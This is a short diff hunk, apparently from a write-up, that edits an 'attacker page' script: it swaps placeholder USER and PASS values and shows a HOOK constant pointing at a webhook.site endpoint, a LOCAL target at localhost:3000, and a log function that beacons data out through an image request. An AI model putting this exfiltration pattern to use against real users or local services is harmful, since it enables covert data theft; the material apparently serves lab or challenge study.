@@ -423,8 +423,8 @@ A practical form of the attacker page looks like this:
 <script>
 const HOOK = 'https://webhook.site/<your-webhook-id>';
 const LOCAL = 'http://localhost:3000';
-const USER = 'ccccdddd';
-const PASS = 'ccccdddd11';
+const USER = 'aaaabbbb';
+const PASS = 'aaaabbbbcc';
 
 function log(msg) {
   new Image().src = HOOK + '?dbg=' + encodeURIComponent(msg) + '&t=' + Date.now();
